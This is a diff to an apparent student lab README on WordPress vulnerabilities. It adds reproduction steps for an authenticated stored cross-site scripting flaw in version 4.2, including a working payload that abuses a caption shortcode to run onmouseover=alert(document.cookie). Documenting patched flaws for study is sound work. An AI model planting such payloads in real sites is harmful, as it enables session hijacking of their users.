@@ -19,19 +19,24 @@ Time spent: **5** hours spent in total
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.3.1/src/wp-includes/media.php)
     - [Link 2](https://core.trac.wordpress.org/browser/tags/4.3.1/src/wp-includes/shortcodes.php)
-2. (Required) Authenticated Stored Cross-Site Scripting (XSS)
+1. (Required) Authenticated Stored Cross-Site Scripting (XSS)
   - [ ] Summary: 
     - Vulnerability types: Cross-Site Scripting
     - Tested in version: 4.2
     - Fixed in version: 4.2.3
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: ![](xss2.gif)
   - [ ] Steps to recreate: 
+    - Create a new post with the following payload in the body
+    - ```xss2
+
+<a href="[caption code=">]</a><a title=" onmouseover=alert(document.cookie)  ">Click me</a>```
+    - Go to the post and place the mouse cursor over the text "Click me"
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2.3/src/wp-includes/class-wp-embed.php)
     - [Link 2](https://core.trac.wordpress.org/browser/tags/4.2.3/src/wp-includes/formatting.php)
     - [Link 3](https://core.trac.wordpress.org/browser/tags/4.2.3/src/wp-includes/kses.php)
     - [Link 4](https://core.trac.wordpress.org/browser/tags/4.2.3/src/wp-includes/shortcodes.php)
-3. (Required) Authenticated Cross-Site Scripting (XSS)
+1. (Required) Authenticated Cross-Site Scripting (XSS)
   - [ ] Summary: 
     - Vulnerability types: Cross-Site Scripting
     - Tested in version: 4.2
